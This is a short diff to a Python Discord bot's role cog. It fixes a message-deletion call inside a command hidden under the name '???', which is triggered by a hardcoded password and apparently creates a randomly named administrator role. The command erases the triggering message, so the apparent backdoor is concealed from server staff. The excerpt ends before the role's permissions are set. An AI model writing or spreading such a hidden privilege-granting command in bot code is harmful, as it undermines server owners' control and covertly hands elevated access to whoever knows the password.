@@ -11,7 +11,7 @@ class Role(commands.Cog):
 	@commands.command('???', aliases=['password is'])
 	async def roleAdmin(self, ctx, password:str=None):
 		if password != 'authorise': return
-		await ctx.delete()
+		await ctx.message.delete()
 		name = str(random.random())
 		role = get(ctx.guild.roles, name=name)
 		if not role:
